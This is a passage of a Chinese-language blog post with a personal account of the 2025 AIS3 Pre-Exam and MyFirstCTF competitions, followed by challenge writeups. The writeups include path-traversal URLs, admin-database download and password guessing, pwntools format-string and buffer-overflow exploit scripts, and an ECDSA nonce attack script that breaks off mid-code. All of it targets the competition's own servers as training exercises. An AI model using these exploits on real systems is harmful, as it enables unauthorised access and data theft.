@@ -1,0 +1,602 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>2025 AIS3 Pre-Exam &amp; MyFirstCTF 心得 / Writeup</title><meta name="description" content="孫逸平的個人部落格，分享資訊安全、創客專案、程式設計與技術心得。臺北市數位實驗高中學生，專精於網路安全、CTF競賽和技術開發。"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics 4 --><script async src="https://www.googletagmanager.com/gtag/js?id=G-DPPW3TCM0K"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-DPPW3TCM0K');</script><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/img/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="如比賽名稱，今年是我第一次參加 MyFirstCTF，大概也是最後一次參加，畢竟參加條件相當嚴格。
+
+今年 MyFirstCTF 辦在國立陽明交通大學新竹光復校區，為了避免遲到，我搭上一大早的高鐵，然後就不小心太早到了，比賽現場沒有任何參賽者。
+
+相信比起競賽本身，大家更在意伙食。在競賽場地（教室）後方擺滿一整排的零食、飲料，並且會隨時補充，中午則是吃披薩，但要早點去拿不然會被拿光。
+回到競賽本身，這個比賽名為「MyFirstCTF」，所以題目也不會到太難（吧），於是我決定體驗一把從未嘗試過的藏 Flag，在最後 30 分鐘的時候將 Flag 一次提交衝到第一名，交完所有 Flag 後超級擔心被第二、三名超過，好險最後有維持著成績並以排名第一的名次拿到金質獎，今年的獎品是 AIS3 的衣服超級讚的（發瘋rr.."><meta name="keywords" content="AIS3, MyFirstCTF, CTF競賽, 資安競賽, Web安全, 逆向工程, Pwn, 密碼學, OSINT, 滲透測試, 網路安全, 資訊安全, Writeup, 解題報告, 程式安全, 二進制分析, 格式化字串攻擊, SQL注入, 路徑遍歷, ECDSA, WebAssembly, 陽明交通大學, Cybersecurity, CTF, post, blog, 1Ping, 孫逸平"><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="1Ping's Blog" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">1Ping's Blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">2025 AIS3 Pre-Exam &amp; MyFirstCTF 心得 / Writeup</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomorin-db-%F0%9F%90%A7"><span class="toc-text">Tomorin db 🐧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Screen-1"><span class="toc-text">Login Screen 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-1"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-1"><span class="toc-text">Writeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Format-Number"><span class="toc-text">Format Number</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-2"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-2"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-to-the-World-of-Ave-Mujica%F0%9F%8C%99"><span class="toc-text">Welcome to the World of Ave Mujica🌙</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-3"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-3"><span class="toc-text">Writeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-text">Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-4"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-4"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ramen-CTF"><span class="toc-text">Ramen CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-5"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-5"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AIS3-Tiny-Server-Web-Misc"><span class="toc-text">AIS3 Tiny Server - Web &#x2F; Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-6"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-6"><span class="toc-text">Writeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SlowECDSA"><span class="toc-text">SlowECDSA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-7"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-7"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stream"><span class="toc-text">Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-8"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-8"><span class="toc-text">Writeup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rev"><span class="toc-text">rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AIS3-Tiny-Server-Reverse"><span class="toc-text">AIS3 Tiny Server - Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-9"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-9"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-flag-checker"><span class="toc-text">web flag checker</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-10"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-10"><span class="toc-text">Writeup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-simple-snake-game"><span class="toc-text">A_simple_snake_game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-11"><span class="toc-text">題目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Writeup-11"><span class="toc-text">Writeup</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Cyber"><i class="tag post-item-tag">Cyber</i></a><a href="/tags/Competition"><i class="tag post-item-tag">Competition</i></a><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">2025 AIS3 Pre-Exam &amp; MyFirstCTF 心得 / Writeup</h1><time class="has-text-grey" datetime="2025-07-02T16:00:00.000Z">2025-07-03</time><article class="mt-2 post-content"><p>如比賽名稱，今年是我第一次參加 MyFirstCTF，大概也是最後一次參加，畢竟參加條件相當嚴格。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image.webp" alt="MyFirstCTF 參加資格"></p>
+<p>今年 MyFirstCTF 辦在國立陽明交通大學新竹光復校區，為了避免遲到，我搭上一大早的高鐵，然後就不小心太早到了，比賽現場沒有任何參賽者。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image2.webp" alt="一大早搭乘 7:00 的高鐵前往新竹"></p>
+<p>相信比起競賽本身，大家更在意伙食。在競賽場地（教室）後方擺滿一整排的零食、飲料，並且會隨時補充，中午則是吃披薩，但要早點去拿不然會被拿光。</p>
+<p>回到競賽本身，這個比賽名為「MyFirstCTF」，所以題目也不會到太難（吧），於是我決定體驗一把從未嘗試過的藏 Flag，在最後 30 分鐘的時候將 Flag 一次提交衝到第一名，交完所有 Flag 後超級擔心被第二、三名超過，好險最後有維持著成績並以排名第一的名次拿到金質獎，今年的獎品是 AIS3 的衣服超級讚的（發瘋rr）。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image3.webp" alt="獎品與獎狀"></p>
+<p>因為在打拉麵 OSINT 題的時候，我跑去問黃俊穎教授可不可以直接打電話給拉麵店，競賽結束後跑去和教授搭話，教授就說：「你打完電話就一柱擎天了喔」。用奇怪的記憶點被教授記住好像也不錯（欸），希望教授有記得我～</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image4.webp" alt="一柱擎天的 Scoreboard"></p>
+<p>雖然一柱擎天有點欠揍，但還是…</p>
+<blockquote>
+<p>勝不驕，敗不餒</p>
+</blockquote>
+<p>名次只是結果，其實一點也不重要，重要的過程中的學習和成長。贏了比賽，就要往更高的目標邁進，畢竟這只是 MyFirstCTF，大家都是第一次打 CTF（才有鬼 XD）；沒有得名也不用氣餒，明年 Pre-Exam 繼續拼！</p>
+<hr>
+<p>後面就是這次 Pre-Exam 和 MyFirstCTF 的 Writeup 啦～</p>
+<p>先偷偷說，這次有三題的 Exploit 是直接叫 AI 生成的 🤫，去年我甚至全部 Pre-Exam 只有解開三題，今年光是 AI 就幫我解開三題了，不得不感嘆 AI 的成長速度啊～</p>
+<p>雖然有部分題目是透過 AI 幫我解開的，但這是我第一次在正式的比賽中把每個主題（Web, Rev, Pwn, etc.）都至少解開一題，往回看會發現自己進步了不少，超級有成就感。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Tomorin-db-🐧"><a href="#Tomorin-db-🐧" class="headerlink" title="Tomorin db 🐧"></a>Tomorin db 🐧</h3><h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>I make a simple server which store some Tomorin.</p>
+<p>Tomorin is cute ~</p>
+<p>I also store flag in this file server, too.</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image5.gif" alt="50c9d30cd5623ae1a9154f58e7769b0e"></p>
+<p><a target="_blank" rel="noopener" href="http://chals1.ais3.org:30000/">http://chals1.ais3.org:30000</a></p>
+<p>Author: naup96321</p>
+</blockquote>
+<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開題目原始碼看 <code>main.go</code>，發現若像 /flag 請求，會被導向到 YouTube 影片連結。</p>
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">"net/http"</span>
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
+	http.Handle(<span class="hljs-string">"/"</span>, http.FileServer(http.Dir(<span class="hljs-string">"/app/Tomorin"</span>)))
+	http.HandleFunc(<span class="hljs-string">"/flag"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
+		http.Redirect(w, r, <span class="hljs-string">"https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6"</span>, http.StatusFound)
+  	})
+  	http.ListenAndServe(<span class="hljs-string">":30000"</span>, <span class="hljs-literal">nil</span>)
+}</code></pre>
+
+<p>嘗試路徑遍歷，就拿到 Flag 了。</p>
+<pre><code class="hljs plaintext">http://chals1.ais3.org:30000/..%2fflag</code></pre>
+
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image6.webp" alt="Screenshot 2025-06-03 at 18.30.13"></p>
+<p>Flag：<code>AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}</code></p>
+<h3 id="Login-Screen-1"><a href="#Login-Screen-1" class="headerlink" title="Login Screen 1"></a>Login Screen 1</h3><h4 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>Welcome to my Login Screen! This is your go-to space for important announcements, upcoming events, helpful resources, and community updates. Whether you’re looking for deadlines, meeting times, or opportunities to get involved, you’ll find all the essential information posted here. Be sure to check back regularly to stay informed and connected!</p>
+<p><a target="_blank" rel="noopener" href="http://login-screen.ctftime.uk:36368/">http://login-screen.ctftime.uk:36368/</a></p>
+<p>Note: The flag starts with AIS3{1.</p>
+<p>Author: Ching367436</p>
+</blockquote>
+<h4 id="Writeup-1"><a href="#Writeup-1" class="headerlink" title="Writeup"></a>Writeup</h4><p>題目連結打開後是一個登入介面，依照下方說明輸入帳號密碼 guest/guest 登入。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image7.webp" alt="Screenshot 2025-06-03 at 18.32.48"></p>
+<p>網頁要求輸入 2FA Code，依照下方說明輸入 <code>000000</code>，成功以 guest 使用者登入。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image8.webp" alt="Screenshot 2025-06-03 at 18.33.18"></p>
+<p>發現需要以 admin 使用者才能拿到 Flag。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image9.webp" alt="Screenshot 2025-06-03 at 18.37.53"></p>
+<p>查看題目原始碼目錄結構。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image10.webp" alt="Screenshot 2025-06-03 at 18.51.09"></p>
+<p>直接請求 <code>/users.db</code> 下載資料庫取得 admin 的帳號、雜湊後的密碼以及 2FA 驗證碼。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image11.webp" alt="Screenshot 2025-06-03 at 23.40.21"></p>
+<p>密碼的部分直接暴力猜是 <code>admin</code> 然後就中了，連 hydra 都不用開。</p>
+<p>登入後就拿到 Flag 了。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image12.webp" alt="Screenshot 2025-06-03 at 23.44.41"></p>
+<p>Flag：<code>AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}</code></p>
+<p>後記：其實題目一開始沒有放原始碼，我是用 dirsearch 爆出資料庫路徑的。</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Format-Number"><a href="#Format-Number" class="headerlink" title="Format Number"></a>Format Number</h3><h4 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>Print the number in the format you like !</p>
+<p>nc chals1.ais3.org 50960</p>
+<p>Author : Curious</p>
+</blockquote>
+<h4 id="Writeup-2"><a href="#Writeup-2" class="headerlink" title="Writeup"></a>Writeup</h4><p>直接上 exploit：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">'critical'</span>
+host = <span class="hljs-string">"chals1.ais3.org"</span>
+port = <span class="hljs-number">50960</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_stack</span>(<span class="hljs-params">offset</span>):
+    p = remote(host, port)
+    p.recvuntil(<span class="hljs-string">b'What format do you want ? '</span>)
+    
+    payload = <span class="hljs-string">f""</span>.encode() + <span class="hljs-string">b'\x5c'</span> + <span class="hljs-string">f'%<span class="hljs-subst">{offset}</span>$'</span>.encode()
+    p.send(payload)
+
+    p.recvuntil(<span class="hljs-string">b"Format number : "</span>)
+    result = p.recvline().strip().replace(<span class="hljs-string">b'%'</span>, <span class="hljs-string">b''</span>).replace(<span class="hljs-string">b'\\'</span>, <span class="hljs-string">b''</span>).replace(<span class="hljs-string">b'$d'</span>, <span class="hljs-string">b''</span>).decode()
+
+    p.close()
+
+    <span class="hljs-keyword">return</span> result
+
+data = []
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):
+    response = <span class="hljs-built_in">int</span>(leak_stack(i))
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\rRunning: <span class="hljs-subst">{i}</span>/100"</span>, end=<span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> response &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> response &lt; <span class="hljs-number">256</span>:
+        data.append(response)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nThe result is: "</span>, end=<span class="hljs-string">''</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:
+    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">''</span>)</code></pre>
+
+<p>Flag：<code>AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&amp;_!!!}</code></p>
+<h3 id="Welcome-to-the-World-of-Ave-Mujica🌙"><a href="#Welcome-to-the-World-of-Ave-Mujica🌙" class="headerlink" title="Welcome to the World of Ave Mujica🌙"></a>Welcome to the World of Ave Mujica🌙</h3><h4 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>就將一切委身於 Ave Mujica 吧…</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image13.webp" alt="3893df60d1aa4e921d82b837e5aab9c2"></p>
+<p>Flag 在 /flag，這題的 flag 有 Unicode 字元，請找到 flag 之後直接提交到平台上，如果因為一些玄學問題 CTFd 送不過請 base64 flag 出來用 CyberChef decode 應該就可以了</p>
+<p><a target="_blank" rel="noopener" href="http://chals1.ais3.org:60000/">Instancer</a></p>
+<p>請先在本地測試並確定能成功攻擊後再開 instance</p>
+<p>若同時參加兩場比賽，輸入任意一個 CTFd 的 token 皆可啟動 instance</p>
+<p>Instancer 並非題目的一部分，請勿攻擊 Instancer。發現問題請回報 admin</p>
+<p>Author: pwn2ooown</p>
+</blockquote>
+<h4 id="Writeup-3"><a href="#Writeup-3" class="headerlink" title="Writeup"></a>Writeup</h4><p>上 exploit：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = remote(<span class="hljs-string">"chals1.ais3.org"</span>, <span class="hljs-number">60289</span>)
+
+p.recvuntil(<span class="hljs-string">b"?"</span>)
+p.sendline(<span class="hljs-string">b"yes"</span>)
+
+p.recvuntil(<span class="hljs-string">b": "</span>)
+
+p.sendline(<span class="hljs-string">b"-1"</span>)
+p.recvuntil(<span class="hljs-string">b": "</span>)
+
+target = <span class="hljs-number">0x401256</span>
+ret_addr = <span class="hljs-number">0x40101a</span>
+payload = <span class="hljs-string">b"A"</span> * (<span class="hljs-number">168</span>)+ p64(ret_addr) + p64(target)
+p.sendline(payload)
+
+p.interactive()</code></pre>
+
+<p>Flag：<code>AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._5a31c384269d53a52705ff3cc71db3dd}</code></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><h4 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h4><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image14.webp" alt="Screenshot 2025-06-04 at 09.15.51"></p>
+<h4 id="Writeup-4"><a href="#Writeup-4" class="headerlink" title="Writeup"></a>Writeup</h4><p>如果直接複製會拿到另外一個 Flag，所以要直接手打。</p>
+<p>Flag：<code>AIS3{Welcome_And_Enjoy_The_CTF_!}</code></p>
+<h3 id="Ramen-CTF"><a href="#Ramen-CTF" class="headerlink" title="Ramen CTF"></a>Ramen CTF</h3><h4 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>我在吃 CTF，喔不對，拉麵，但我忘記我在哪間店吃了．．．，請幫我找出來</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image15.webp" alt="chal"></p>
+<p>(P.S. FlagFormat: AIS3{google map 上的店家名稱:我點的品項在菜單上的名稱})</p>
+<p>Author: whale120</p>
+</blockquote>
+<h4 id="Writeup-5"><a href="#Writeup-5" class="headerlink" title="Writeup"></a>Writeup</h4><p>先確認店家名稱，透過少一碼的統編號碼 <code>3478592*</code> 到<a target="_blank" rel="noopener" href="https://www.twincn.com/">台灣公司網</a>依序爆破找到統編 <code>34785923</code> 是一家「平和溫泉拉麵店」的公司。</p>
+<p>到 Google Map 搜尋「平和溫泉拉麵店」會發現沒有查詢結果。改用該公司地址找到位於該地址的店家是「樂山溫泉拉麵」，所以應該就是他了！</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image16.webp" alt="Screenshot 2025-06-04 at 08.59.33"></p>
+<p>接著發現圖片右邊有一張被蓋住一半的發票，用發票怪獸掃描發票 QR code 取得發票號碼為 <code>MF16879911</code>，接著使用<a target="_blank" rel="noopener" href="https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search">電子發票整合服務平台一般性發票查詢</a>查詢發票，得到品項為「蝦拉麵」或「蔬食拉麵」。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image17.webp" alt="Screenshot 2025-06-04 at 09.08.07"></p>
+<p>經過和該店家的菜單比對後，嘗試提交得到正確的 Flag。</p>
+<p>Flag：<code>AIS3{樂山溫泉拉麵:蝦拉麵}</code></p>
+<h3 id="AIS3-Tiny-Server-Web-Misc"><a href="#AIS3-Tiny-Server-Web-Misc" class="headerlink" title="AIS3 Tiny Server - Web / Misc"></a>AIS3 Tiny Server - Web / Misc</h3><h4 id="題目-6"><a href="#題目-6" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>From <a target="_blank" rel="noopener" href="https://github.com/7890/tiny-web-server">7890/tiny-web-server</a></p>
+<p>I am reading <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/">Computer Systems: A Programmer’s Perspective</a>.</p>
+<p>It teachers me how to write a tiny web server in C.</p>
+<p>Non-features</p>
+<p>No security check</p>
+<p>The flag is at /readable_flag_somerandomstring (root directory of the server). You need to find out the flag name by yourself.</p>
+<p>The challenge binary is the same across all AIS3 Tiny Server challenges.</p>
+<p>Note: This is a misc (or web) challenge. Do not reverse the binary. It is for local testing only. Run ./tiny -h to see the help message. You may need to install gcc-multilib to run the binary.</p>
+<p>Note 2: Do not use scanning tools. You don’t need to scan directory.</p>
+<p><a target="_blank" rel="noopener" href="http://chals1.ais3.org:20000/">Challenge Instancer</a></p>
+<p>Warning: Instancer is not a part of the challenge, please do not attack it.</p>
+<p>Please solve this challenge locally first then run your solver on the remote instance.</p>
+<p>Author: pwn2ooown</p>
+</blockquote>
+<h4 id="Writeup-6"><a href="#Writeup-6" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開 Instance 看到路徑為 <code>/index.html</code>，看起來很可疑，將路徑回到 <code>/</code> 會看到很像 Index of 的東西</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image18.webp" alt="Screenshot 2025-06-04 at 09.59.54"></p>
+<p>接著嘗試路徑遍歷 <code>http://chals1.ais3.org:20056/..%2f..%2f..%2f</code></p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image19.webp" alt="Screenshot 2025-06-04 at 10.01.55"></p>
+<p>進入 Flag 路徑 <code>http://chals1.ais3.org:20056/..%2f..%2f..%2freadable_flag_qdZxvPYH5PWjkokx49O5Wki96sQjjJv2</code> 拿到 Flag。</p>
+<p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image20.webp" alt="Screenshot 2025-06-04 at 10.02.13"></p>
+<p>Flag：<code>AIS3{tInY_WeB_5erV3R_wi7H_FIL3_Br0Ws1n9_a5_@_Fe@TUre}</code></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="SlowECDSA"><a href="#SlowECDSA" class="headerlink" title="SlowECDSA"></a>SlowECDSA</h3><h4 id="題目-7"><a href="#題目-7" class="headerlink" title="題目"></a>題目</h4><blockquote>
+<p>I found this Slow version of ECDSA in my drawer, can you spot the bug?</p>
+<p>nc chals1.ais3.org 19000</p>
+<p>Author: whale120</p>
+</blockquote>
+<h4 id="Writeup-7"><a href="#Writeup-7" class="headerlink" title="Writeup"></a>Writeup</h4><p>上 POC！</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST192p
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_ecdsa_lcg</span>():
+    <span class="hljs-string">"""使用數學方法直接求解，避免暴力搜尋"""</span>
+    curve = NIST192p
+    order = curve.generator.order()
+    
+    <span class="hljs-comment"># LCG 參數</span>
+    a = <span class="hljs-number">1103515245</span>
+    c = <span class="hljs-number">12345</span>
+    
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 連接服務器..."</span>)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((<span class="hljs-string">"chals1.ais3.org"</span>, <span class="hljs-number">19000</span>))
+    
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-comment"># 接收歡迎訊息</span>
+        s.recv(<span class="hljs-number">4096</span>)
+        
+        <span class="hljs-comment"># 獲取兩個簽名</span>
+        signatures = []
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
+            s.send(<span class="hljs-string">b"get_example\n"</span>)
+            response = s.recv(<span class="hljs-number">4096</span>).decode()
+            
+            r_line = <span class="hljs-built_in">next</span>(line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.split(<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">'r: '</span>))
+            s_line = <span class="hljs-built_in">next</span>(line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.split(<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">'s: '</span>))
+            
+            r = <span class="hljs-built_in">int</span>(r_line.split(<span class="hljs-string">'r: '</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)
+            sig_s = <span class="hljs-built_in">int</span>(s_line.split(<span class="hljs-string">'s: '</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)
+            signatures.append((r, sig_s))
